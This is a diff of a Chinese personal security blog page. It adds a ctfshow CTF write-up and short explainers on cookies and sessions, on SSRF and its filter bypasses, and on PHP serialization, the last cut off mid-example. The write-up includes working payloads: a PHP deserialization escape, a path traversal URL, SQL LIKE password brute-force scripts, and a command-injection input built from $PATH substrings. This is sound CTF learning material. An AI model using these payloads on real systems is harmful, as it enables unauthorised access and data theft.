@@ -6,11 +6,11 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | Solkatt的小窝</title>
+  <title>Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="http://example.com/archives/index.html">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="Solkatt">
@@ -152,302 +152,1189 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ctfshow月饼杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/08/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/">ctfshow月饼杯</a>
+    </h1>
+  
+
+        
+        <a href="/2021/10/08/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/" class="archive-article-date">
+  	<time datetime="2021-10-08T13:29:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-08</time>
+</a>
+        
+      </header>
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h1><p><em><strong>一江春水何年尽，万古清光此夜圆</strong></em></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211008213201404.png" alt="image-20211008213201404"></p>
+<p>打开题目发现有php源码可以下载（最先点快了根本没发现，点进去一脸懵逼还扫了半天目录）下载下来，发现源码。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211008213321392.png" alt="image-20211008213321392"></p>
+<p>这里哥们一看就知道是似曾相识题型。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13338789.html">php反序列化</a>。</p>
+<p>简单的思路就是把我们输入的参数通过字符逃逸的方式，让密码等于yu22x，就可以得到flag</p>
+<p>我们需要的是在最后构造一个**”;s:8:”password”;s:5:”yu22x”;}<strong>，(</strong>“;<strong>这两个符号是为了闭合前面的Firebasky字符串。后面的</strong>}<strong>是为了结束反序列化，让本来应该加入反序列化的</strong>“;s:8:”password”;s:1:”1”}**被舍弃掉)</p>
+<p>这里一共有30个字符，而发现这里的过滤函数将Firebasky替换成Firebaskyup，一下子增加两个字符，算一下就需要填写15个Firebasky，所以我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后通过get方式提交就可以得到flag了</p>
+<h1 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h1><p><em><strong>三五夜中新月色，两千里外故人心</strong></em></p>
+<p>打开环境，迎面而来就是php代码，而且这个代码4个if在递进，就更加让人心烦了。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211008220728448.png" alt="image-20211008220728448"></p>
+<p>我们一个一个看</p>
+<p>第一关需要过变量a的数字验证关。要求为：is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0</p>
+<p>这里需要知道php的一个知识点，php在一个特别小的数的时候，进行平方运算时，会被截断，由于这里限制了strlen，所以我们的办法是采用科学计数法，即1e-162.就可以完成第一个条件。</p>
+<p>第二个我也一直看不懂，后头看了网上的wp，才知道原来是有提示的，但是不知道为什么现在好像没看到了。原题提示如图：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009104323259.png" alt="image-20211009104323259"></p>
+<p>可以知道，他给出了一些关于后几位的数字。我们知道md5的碰撞原理是md5经过加密后，哈希值前面的字符串为0e，然后php语言会默认当作科学计数法，于是第一个数字就是0，就完成了md5的碰撞。为了满足$b==hash(“md2”, $b)和$c==hash(“md2”,hash(“md2”, $c))这两个条件，我们需要满足的是<strong>原变量b和c与hash出来的字符串前面都会有0e</strong>。这样的话，相当于就满足了<strong>0=0</strong>条件。</p>
+<p>于是我们需要写一个php脚本来爆出原来的数字。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=0;$i&lt;999;$i++)&#123;</span><br><span class="line">	$b=&#x27;0e&#x27;.$i.&#x27;024452&#x27;;</span><br><span class="line">	if($b==hash(&#x27;md2&#x27;,$b))&#123;</span><br><span class="line">		echo $b;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line">echo&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">for ($j=1000;$j&lt;=9999;$j++)&#123;</span><br><span class="line">	$c=&#x27;0e&#x27;.$j.&#x27;48399&#x27;;</span><br><span class="line">	if($c==hash(&#x27;md2&#x27;,hash(&#x27;md2&#x27;,$c)))&#123;</span><br><span class="line">		echo $c;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后爆出b=0e652024452 c=0e603448399</p>
+<p>接下来是最后一个，需要以post的方式提交url。这里科普一下以下几个函数：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/20191018141048779.png" alt="img"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009112720788.png" alt="image-20211009112720788"></p>
+<p>观察源码可以发现，他主要是做了以下几步：</p>
+<p> if(filter_var($url[1],FILTER_VALIDATE_URL)) 用来判断数据符不符合url格式。</p>
+<p> $host=parse_url($url[1]); 用parse_url函数解析该url，形成一个数组。</p>
+<p>if(preg_match(‘/ctfshow.com$/‘,$host[‘host’]))，如果host名中有ctfshow.com就可以了</p>
+<p>这里我们还需要知道一个知识点，php源码中，在向目标请求时先会判断使用的协议，如果协议无法识别，就会认为它是一个目录，所以这里我们可以运用目录穿越漏洞。</p>
+<p>构造payload=</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=abc://ctfshow.com/../../../../../fl0g.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里要返回多少个前目录，我也是一个一个试出来的……</p>
+<h1 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h1><p><em><strong>皎洁一年惟此夜，莫教容易负婵娟</strong></em></p>
+<p>这道题打开网页源码一看就可以知道</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009142528411.png" alt="image-20211009142528411"></p>
+<p>是想要考like查询。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cl1024cl/p/6205484.html">like模糊查询</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">like模糊匹配</span><br><span class="line">% 表示零个或多个字符的任意字符串</span><br><span class="line">_（下划线）表示任何单个字符</span><br><span class="line">[ ] 表示指定范围 ([a-f]) 或集合 ([abcdef]) 中的任何单个字符</span><br><span class="line">[^] 不属于指定范围 ([a-f]) 或集合 ([abcdef]) 的任何单个字符</span><br><span class="line">* 它同于DOS命令中的通配符，代表多个字符</span><br><span class="line">？同于DOS命令中的？通配符，代表单个字符</span><br><span class="line"># 大致同上，不同的是代只能代表单个数字</span><br></pre></td></tr></table></figure>
+
+<p>要想猜到密码，首先需要知道密码位数。然后去网上看其他师傅的脚本抄了一个猜位数的脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://0162cf6c-3e6d-4639-bb8e-cfadfcd47c23.challenge.ctf.show:8080/login.php&#x27;</span><br><span class="line">def get(a):</span><br><span class="line">    s=&#x27;&#x27;</span><br><span class="line">    while(a&gt;0):</span><br><span class="line">        s+=&#x27;_&#x27;</span><br><span class="line">        a-=1</span><br><span class="line">    return s</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    data=&#123;</span><br><span class="line">        &#x27;username&#x27;:&#x27;yu22x&#x27;,</span><br><span class="line">        &#x27;password&#x27;:f&#x27;&#123;get(i)&#125;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,data=data)</span><br><span class="line">    if &#x27;wrong username or password&#x27; in r.text:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以知道密码为32位。</p>
+<p>然后又需要写脚本来爆破，这里也看了网上师傅的脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">a=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">url = &#x27;http://0162cf6c-3e6d-4639-bb8e-cfadfcd47c23.challenge.ctf.show:8080/login.php&#x27;</span><br><span class="line"></span><br><span class="line">pwd = &#x27;&#x27;</span><br><span class="line">for i in range(32):</span><br><span class="line">    print(&#x27;i = &#x27;+str(i+1),end=&#x27;\t&#x27;)</span><br><span class="line">    for j in a:</span><br><span class="line">        password = pwd + j + (31 - i) * &#x27;_&#x27;</span><br><span class="line">        data = &#123;&#x27;username&#x27;:&#x27;yu22x&#x27;,&#x27;password&#x27;:password&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &#x27;wrong&#x27; not in r.text:</span><br><span class="line">             pwd += j</span><br><span class="line">             print(pwd)</span><br><span class="line">             break</span><br></pre></td></tr></table></figure>
+
+<p>得到密码为：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009144954720.png" alt="image-20211009144954720"></p>
+<p>成功通过用户名和密码登录后台，发现一个神奇的查询网址</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009150744353.png" alt="image-20211009150744353"></p>
+<p>通过bp抓包进行爆破，会发现小写字母全部被过滤了，然后用fuzz测试，可以发现，大写字母，数字，{},空格，$,~可以使用。根据题目的提示：<strong>环境变量 +linux字符串截取 + 通配符</strong>再加上网上师傅的答案，我们可以通过linux系统的$PATH环境变量来构造特殊的字符串命令。</p>
+<p>这里进行一下解释：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009151246244.png" alt="image-20211009151246244"></p>
+<p>在linux中输出$PATH时，他会给出一个字符串目录，我们可以通过字符串截取的操作来取得想要的字符。比如:</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009151400787.png" alt="image-20211009151400787"></p>
+<p>该命令意思是从$PATH变量里的第五个字符开始，拿1位字符，对照上图来看，第五个字符就是l，所以可以得到l。因此我们可以使用**ip=1;${PATH:5:1}${PATH:2:1}**来查询系统的文件。</p>
+<p>ps：在这里要提醒大家，应该是环境原因，如果你post提交数据的时候，前面不加**ip=**，我的环境就会崩掉。发现加了ip=就正常使用</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009151713694.png" alt="image-20211009151713694"></p>
+<p>可以看到有flag.php文件。</p>
+<p>然后我们通过构造nl命令，可以查看该文件。</p>
+<p>这里又需要用到liunx中的通配符知识，liunux中，问号表示一个字符，我们发现flag.php有总共7个字，于是我们可以构造</p>
+<p><strong>ip=0;${PATH:14:1}${PATH:5:1} ????.???</strong></p>
+<p>这个来查看该文件，之后打开源代码即可发现flag</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009152659082.png" alt="image-20211009152659082"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/17/hello-world/" class="archive-article-date">
-  	<time datetime="2022-01-16T17:06:15.405Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/17/hello-world/">Hello World</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/" class="archive-article-date">
-  	<time datetime="2022-01-16T14:26:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/16/%E5%88%9D%E5%85%A5%E5%85%8D%E6%9D%80/">初入免杀</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/" class="archive-article-date">
-  	<time datetime="2022-01-11T14:54:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A6/">ctf密码学</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
       
-        </div></section>
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/10/08/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-session-and-cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/09/session-and-cookie/">session and cookie</a>
+    </h1>
+  
+
+        
+        <a href="/2021/09/09/session-and-cookie/" class="archive-article-date">
+  	<time datetime="2021-09-09T02:12:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="cookie-和-session"><a href="#cookie-和-session" class="headerlink" title="cookie 和 session"></a>cookie 和 session</h1><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>Cookie意为甜饼，是一种身份认证证明，由于http是一种无状态的协议，服务器单从网络连接上无从知道客户身份，于是服务器就给客户端们颁发了一个通行证，每人一个，无论谁访问都必须携带通行证，这样就能确定客户的身份。这就是cookie的原理</p>
+<p>cookie是一小段文本信息，当客户端请求服务器时，如果服务器需要记录用户状态，就通过response对客户端颁发cookie，客户端就会把cookie保存起来。借此以后请求的时候，就会带着cookie一起请求，来辨认用户状态，服务器还可以根据需要修改cookie的内容。</p>
+<p>cookie用来管理服务器和客户之间的状态。</p>
+<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>session是另一种记录客户状态的机制，不同的是cookie保存在客户端浏览器，但是session保存在服务器上，客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session。之后客户端浏览器再次访问时就只需要从session中查找该客户状态就可以了。</p>
+<h2 id="session会在cookie中出现和传输，属于cookie的一部分。"><a href="#session会在cookie中出现和传输，属于cookie的一部分。" class="headerlink" title="session会在cookie中出现和传输，属于cookie的一部分。"></a>session会在cookie中出现和传输，属于cookie的一部分。</h2><p>当web服务器开启会话机制时，用户登陆成功后，会将会话保存在服务器中。</p>
+<p><strong>如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。</strong></p>
+<h2 id="cookie和session的不同"><a href="#cookie和session的不同" class="headerlink" title="cookie和session的不同"></a>cookie和session的不同</h2><ol>
+<li> 数据存放位置不同。</li>
+</ol>
+<p>   cookie存放在客户的浏览器上，session存在服务器上。</p>
+<ol start="2">
+<li><p>安全程度不同。</p>
+<p>cookie不是很安全，别人可以分析放在本地的cookie进行cookie欺骗，考虑到安全应当使用。</p>
+</li>
+<li><p>性能使用程度不同</p>
+<p>session会在一定内保存在服务器上，当访问增多，会占用较多服务器性能。为了减轻服务器压力，应该使用cookie</p>
+</li>
+<li><p>数据存储大小不同</p>
+<p>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie，而session则存储与服务端，浏览器对其没有限制。cookie数据保存在客户端的浏览器，session数据保存在服务器端。</p>
+</li>
+<li><p>会话机制不同</p>
+<p>session会话机制：session会话机制是一种服务器端机制，它使用类似于哈希表（可能还有哈希表）的结构来保存信息。</p>
+<p>cookies会话机制：cookie是服务器存储在本地计算机上的小块文本，并随每个请求发送到同一服务器。 Web服务器使用HTTP标头将cookie发送到客户端。在客户端终端，浏览器解析cookie并将其保存为本地文件，该文件自动将来自同一服务器的任何请求绑定到这些cookie。</p>
+</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/09/session-and-cookie/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="archives">
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-SSRF漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-12-28T03:35:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-28</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/12/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
+      <a class="article-title" href="/2021/08/12/SSRF%E6%BC%8F%E6%B4%9E/">SSRF漏洞</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2021/08/12/SSRF%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2021-08-12T02:19:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>SSRF(Server-Side Request Forgery:<strong>服务器端请求伪造</strong>) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<strong>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</strong></p>
+<p>SSRF的划分界限：</p>
+<ol>
+<li>只要能发起网络请求就是存在漏洞，因为有风险。</li>
+<li>只有访问到内网和本机（本机比内网更脆弱）才算存在SSRF。</li>
+</ol>
+<h2 id="CSRF与SSRF"><a href="#CSRF与SSRF" class="headerlink" title="CSRF与SSRF"></a>CSRF与SSRF</h2><p>CSRF跨站请求伪造，浏览器偷偷发包。</p>
+<p>SSRF你可以控制目标站点，往其他网站发包。</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>很多web应用都提供了从其他服务器上获得数据的功能。使用用户指定的url，web应用可以获取图片，下载文件，读取文件内容登。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制。</p>
+<p>大部分的web服务器架构中，web服务器自身都可以访问互联网和服务器所在的内网。</p>
+<h2 id="SSRF可以做什么"><a href="#SSRF可以做什么" class="headerlink" title="SSRF可以做什么"></a>SSRF可以做什么</h2><ul>
+<li>可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。</li>
+<li>攻击运行在内网或者本地的应用程序。</li>
+<li>对内网web应用进行指纹识别，通过访问默认文件实现 。</li>
+<li>攻击内外网的web应用。sql注入、struct2、redis等。</li>
+<li>利用file dict sftp ladp gopher ftp http等协议</li>
+</ul>
+<p>dict协议：dict协议可以查看端口，版本信息这些。向服务器端口请求curl命令。</p>
+<h2 id="怎么去寻找SSRF"><a href="#怎么去寻找SSRF" class="headerlink" title="怎么去寻找SSRF:"></a>怎么去寻找SSRF:</h2><ol>
+<li>看功能(出现外部访问，翻译)。</li>
+<li>看传参。如果说传参中存在有后缀的东西，就很有可能。（为什么有这些东西？1.读取文件显示给你 2.包含文件 3.下载文件）</li>
+<li>传参中出现协议名，也很有可能。</li>
+</ol>
+<p>SSRF是有防护手段的。例如</p>
+<ol>
+<li>正则匹配，不允许传内网地址。</li>
+</ol>
+<p>怎么绕过？</p>
+<ol>
+<li>域名肯定要是解析成ip的，我们自己申请个域名，把地址指向127.0.0.1（比如dnslog可以去查找）</li>
+<li>通过<code>@</code>可以把访问强行拉到后面。(比如:<a target="_blank" rel="noopener" href="http://www.baidu.com@127.0.0.1/1.php">http://www.baidu.com@127.0.0.1/1.php</a>)</li>
+</ol>
+<h2 id="SSRF漏洞如何防御"><a href="#SSRF漏洞如何防御" class="headerlink" title="SSRF漏洞如何防御"></a>SSRF漏洞如何防御</h2><ol>
+<li>统一错误信息</li>
+<li>限制请求的端口</li>
+<li>过滤返回的信息</li>
+<li>黑名单内网ip</li>
+<li>禁用其他协议</li>
+</ol>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/12/SSRF%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2021-12-14T08:14:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-14</time>
-</a>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctf中的一些序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/12/14/json%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">json格式解析</a>
+      <a class="article-title" href="/2021/08/07/ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%8F%E5%88%97%E5%8C%96/">ctf中的一些序列化</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2021/08/07/ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
+  	<time datetime="2021-08-07T09:00:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF中的序列化和反序列化"><a href="#CTF中的序列化和反序列化" class="headerlink" title="CTF中的序列化和反序列化"></a>CTF中的序列化和反序列化</h1><h2 id="序列化和反序列化概念"><a href="#序列化和反序列化概念" class="headerlink" title="序列化和反序列化概念"></a>序列化和反序列化概念</h2><p>序列化就是将对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名</p>
+<p>反序列化则相反将字符串重新恢复成对象</p>
+<p>对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p>
+<h2 id="序列化中常见的魔法函数"><a href="#序列化中常见的魔法函数" class="headerlink" title="序列化中常见的魔法函数"></a>序列化中常见的魔法函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct() 创建对象时调用</span><br><span class="line">__destruct() 销毁对象时调用</span><br><span class="line">__toString() 当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup 将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+
+
+
+
+<h2 id="列子"><a href="#列子" class="headerlink" title="列子"></a>列子</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line"></span><br><span class="line">O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">3 代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line">3 